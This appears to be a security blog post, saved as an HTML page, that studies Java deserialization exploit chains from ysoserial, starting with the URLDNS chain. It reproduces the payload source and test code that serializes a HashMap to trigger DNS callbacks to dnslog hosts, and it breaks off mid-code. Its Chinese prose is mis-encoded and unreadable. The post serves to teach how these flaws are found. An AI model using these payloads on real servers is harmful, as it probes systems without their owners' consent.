

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="Gadget JavaåŸºäº Chris Frohoff å·¥å…·ï¼Œysoserialç ”ç©¶ç³»åˆ—çš„åˆ©ç”¨é“¾ï¼Œåœ¨GeneratePayloadè°ƒç”¨æ¯ä¸€ä¸ªé“¾çš„getObjectæ–¹æ³• URLDNSä½œä¸º DNS æŸ¥è¯¢ï¼ŒURLDNS ä¸éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹åŒ…ï¼Œä¹Ÿä¸å— jdk ç‰ˆæœ¬é™åˆ¶ï¼Œå¸¸ç”¨äºæ£€æµ‹ååºåˆ—åŒ–(åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾æ—¶æ¢æµ‹)ï¼›ä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œåªèƒ½ä½œä¸º DNS è¯·æ±‚ 12345678910111213141516171819">
<meta property="og:type" content="article">
<meta property="og:title" content="Gadget Java">
<meta property="og:url" content="http://example.com/2023/03/15/Gadget%20Java/index.html">
<meta property="og:site_name" content="ğŸ—„">
<meta property="og:description" content="Gadget JavaåŸºäº Chris Frohoff å·¥å…·ï¼Œysoserialç ”ç©¶ç³»åˆ—çš„åˆ©ç”¨é“¾ï¼Œåœ¨GeneratePayloadè°ƒç”¨æ¯ä¸€ä¸ªé“¾çš„getObjectæ–¹æ³• URLDNSä½œä¸º DNS æŸ¥è¯¢ï¼ŒURLDNS ä¸éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹åŒ…ï¼Œä¹Ÿä¸å— jdk ç‰ˆæœ¬é™åˆ¶ï¼Œå¸¸ç”¨äºæ£€æµ‹ååºåˆ—åŒ–(åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾æ—¶æ¢æµ‹)ï¼›ä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œåªèƒ½ä½œä¸º DNS è¯·æ±‚ 12345678910111213141516171819">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818204044179.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220820153609531.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220824224527904.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220825002800801.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829141357207.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829142036388.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-408eaf857d4e79fd633d58da6ff536f0_r.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20230424201812179.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220925211304382.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20221005230840200.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/f9bee6c5293b753f2421c47eb8cfb7e38.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/t01eee470f626eda79e.png">
<meta property="article:published_time" content="2023-03-15T12:56:37.733Z">
<meta property="article:modified_time" content="2023-09-09T06:58:04.633Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png">
  
  <title>Gadget Java - ğŸ—„</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ‘©â€ğŸ’»</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Gadget Java">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2023-03-15 20:56" pubdate>
        March 15, 2023 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      138k å­—
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Gadget Java</h1>
            
            <div class="markdown-body">
              <h1 id="Gadget-Java"><a href="#Gadget-Java" class="headerlink" title="Gadget Java"></a>Gadget Java</h1><p>åŸºäº Chris Frohoff å·¥å…·ï¼Œ<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>ç ”ç©¶ç³»åˆ—çš„åˆ©ç”¨é“¾ï¼Œåœ¨<code>GeneratePayload</code>è°ƒç”¨æ¯ä¸€ä¸ªé“¾çš„<code>getObject</code>æ–¹æ³•</p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>ä½œä¸º DNS æŸ¥è¯¢ï¼ŒURLDNS ä¸éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹åŒ…ï¼Œä¹Ÿä¸å— jdk ç‰ˆæœ¬é™åˆ¶ï¼Œå¸¸ç”¨äºæ£€æµ‹ååºåˆ—åŒ–(åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾æ—¶æ¢æµ‹)ï¼›ä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œåªèƒ½ä½œä¸º DNS è¯·æ±‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br><br>                HashMap ht = <span class="hljs-keyword">new</span> HashMap(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨<code>HashMap.readObject</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>            <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>            <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è¯»å–é”®å€¼å¯¹å¹¶ä¸”<code>put</code>è¿›<code>mapping</code>è¿‡ç¨‹ä¸­ï¼Œè¿›è¡Œäº†<code>putVal</code>ï¼Œå¯¹<code>key</code>è¿›è¡Œäº†<code>hash</code>è®¡ç®—ï¼Œè¿›ä¸€æ­¥è·Ÿè¿›<code>hash</code>æ–¹æ³•å‘ç°ï¼Œå¯¹<code>key</code>è¿›è¡Œäº†<code>hashCode</code>çš„è®¡ç®—ï¼Œè¿™ä¼šè§¦å‘ä¸€æ¬¡ DNS è¯·æ±‚ï¼Œè¿™ç‚¹å¯ä»¥éªŒè¯</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://r5z2ag.ceye.io/&quot;</span>);<br><br>Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hc.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//hc.set(url,123);</span><br>hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br><span class="hljs-comment">//hc.set(url,-1);</span><br><br><span class="hljs-comment">//hc.set()çš„ä½œç”¨æ˜¯åœ¨è°ƒç”¨putæ–¹æ³•å‰ä¿®æ”¹hashCodeä¸ºå…¶ä»–æ•°å€¼ï¼Œè°ƒç”¨putæ–¹æ³•åå†å°†hashCodeä¿®æ”¹å›æ¥ï¼Œé¿å…å‘èµ·DNSè¯·æ±‚</span><br></code></pre></td></tr></table></figure>

<p>ä¼šç¼“å­˜<code>hashCode</code>åˆ™å¯ä»¥æ¢ä¸ª dnslog å¹³å°è¿›è¡ŒéªŒè¯</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png" srcset="/img/loading.gif" lazyload></p>
<p><code>key.hashCode</code>ä¸­ï¼Œ<code>key</code>æ˜¯å¯æ§çš„(æ¥è‡ª<code>readObject</code>è¯»å–åˆ°çš„)ï¼Œå½“ç„¶è¦æ»¡è¶³æ¡ä»¶<code>mappings &gt; 0</code>å³åºåˆ—åŒ–æµä¸ä¸ºç©º</p>
<p>é‚£ä¸ºä»€ä¹ˆä¼šè°ƒç”¨ URLï¼Œå› ä¸º<code>HashMap.put(url,&#39;anything&#39;)</code>url å±äº<code>java.net.URL</code>å¯¹è±¡</p>
<p>é‚£ä¹ˆè·Ÿè¿›<code>key</code>å¯¹è±¡å³<code>java.net.URL</code>çš„<code>hashCode</code>æ–¹æ³•</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818204044179.png" srcset="/img/loading.gif" lazyload></p>
<p>ç¬¬ä¸€ä¸ªæ¡ä»¶è‚¯å®šè·³è¿‡äº†ï¼Œ<code>handler</code>æ˜¯<code>URLStreamHandler</code>çš„å®ä¾‹(ä¸Šé¢æœ‰å®šä¹‰)ï¼Œè·Ÿè¿›å‘ç°æ ¹æ®åè®®<code>InetAddress addr = getHostAddress(u)</code>ï¼Œè¿›ä¸€æ­¥<code>u.hostAddress = InetAddress.getByName(host)</code>ä¹Ÿå°±æ˜¯æ ¹æ®åŸŸåæŸ¥è¯¢ ip å³ä¸€æ¬¡ DNS è¯·æ±‚</p>
<p>è‡³æ­¤ï¼Œæ•´ä¸ªåˆ©ç”¨é“¾ä¹Ÿå¾ˆæ˜æ˜¾</p>
<blockquote>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl">getByName:<span class="hljs-number">1077</span>, InetAddress (java.net)<br>getHostAddress:<span class="hljs-number">442</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">359</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">885</span>, URL (java.net)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>main:<span class="hljs-number">19</span>, Test (ysoserial)<br><br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>readObject()<br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>hash()<br>URL-&gt;hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>getHostAddress()<br>I<span class="hljs-function"><span class="hljs-title">netAddress</span>-&gt;</span>getByName()<br>ä¸Šé¢çš„è°ƒç”¨æ ˆæ˜¯ysoserialå¯¼å‡ºæ¥çš„ï¼Œé‡å†™äº†SilentURLStreamHandlerï¼Œå› æ­¤ç•¥å¾®æœ‰äº›ä¸åŒ<br></code></pre></td></tr></table></figure>
</blockquote>
<p>åºåˆ—åŒ–å¹¶è¾“å‡ºæ–‡ä»¶</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://ir2jn4.dnslog.cn/&quot;</span>);<br><br>        Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hc.setAccessible(<span class="hljs-keyword">true</span>);<br>        hc.set(url,<span class="hljs-number">123</span>);<br>        hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br>        hc.set(url,-<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//è¾“å‡ºåˆ°æ–‡ä»¶</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            FileOutputStream outputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectOutputStream outputStream1 = <span class="hljs-keyword">new</span> ObjectOutputStream(outputStream);<br>            outputStream1.writeObject(hm);<br>            outputStream.close();<br>            outputStream1.close();<br>            FileInputStream inputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>            objectInputStream.readObject();<br>            objectInputStream.close();<br>            inputStream.close();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>å¯¹ç”Ÿæˆçš„æ–‡ä»¶è¿›è¡Œååºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeA</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> 